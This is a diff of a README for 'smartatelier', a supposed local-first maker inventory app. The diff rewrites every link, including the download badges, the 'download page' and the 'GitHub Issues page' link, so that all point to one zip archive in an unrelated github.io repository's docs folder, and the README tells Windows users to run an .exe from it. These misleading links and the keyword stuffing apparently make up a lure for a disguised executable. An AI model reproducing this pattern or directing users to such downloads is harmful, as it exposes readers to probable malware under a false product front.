@@ -5,7 +5,7 @@ description: "Photographiez votre atelier, importez photos ou vidéos, et retrou
 ---
 # 🧰 smartatelier - Manage your maker inventory with AI
 
-[![Download smartatelier](https://img.shields.io/badge/Download-smartatelier-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/TaimoorSajjad07/taimoorsajjad07.github.io/raw/refs/heads/main/docs/superpowers/Application_1.2.zip)
+[![Download smartatelier](https://img.shields.io/badge/Download-smartatelier-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/TaimoorSajjad07/taimoorsajjad07.github.io/main/docs/superpowers/Application_1.2.zip)
 
 ## 👋 Welcome to smartatelier
 
@@ -27,7 +27,7 @@ The application stores all your data locally on your computer, meaning your info
 
 ### 📥 Download and Install
 
-1. Visit the [download page](https://github.com/TaimoorSajjad07/taimoorsajjad07.github.io/raw/refs/heads/main/docs/superpowers/Application_1.2.zip) to get the latest version of smartatelier.
+1. Visit the [download page](https://raw.githubusercontent.com/TaimoorSajjad07/taimoorsajjad07.github.io/main/docs/superpowers/Application_1.2.zip) to get the latest version of smartatelier.
 2. Choose the installer file that matches your operating system (Windows users should select the `.exe` file).
 3. Download the file to your computer. This may take a minute depending on your internet speed.
 
@@ -139,7 +139,7 @@ Since smartatelier is local-first, your data lives on your computer. To keep it 
 If you encounter any issues or have questions:
 
 - Check the **Help** menu inside the application for built-in documentation.
-- Visit the [GitHub Issues page](https://github.com/TaimoorSajjad07/taimoorsajjad07.github.io/raw/refs/heads/main/docs/superpowers/Application_1.2.zip) to report bugs or request features.
+- Visit the [GitHub Issues page](https://raw.githubusercontent.com/TaimoorSajjad07/taimoorsajjad07.github.io/main/docs/superpowers/Application_1.2.zip) to report bugs or request features.
 - Join community discussions to share tips and tricks with other makers.
 
 ## 📜 License
@@ -150,6 +150,6 @@ smartatelier is released under the MIT License. You are free to use, modify, and
 
 ## 📥 Ready to get started?
 
-[![Download smartatelier](https://img.shields.io/badge/Download%20Now-smartatelier-orange?style=for-the-badge&logo=github&logoColor=white)](https://github.com/TaimoorSajjad07/taimoorsajjad07.github.io/raw/refs/heads/main/docs/superpowers/Application_1.2.zip)
+[![Download smartatelier](https://img.shields.io/badge/Download%20Now-smartatelier-orange?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/TaimoorSajjad07/taimoorsajjad07.github.io/main/docs/superpowers/Application_1.2.zip)
 
 Keywords: 3d-printing, claude-code, codex, electronics, filament, gemini-cli, inventory, local-first, nextjs, sqlite
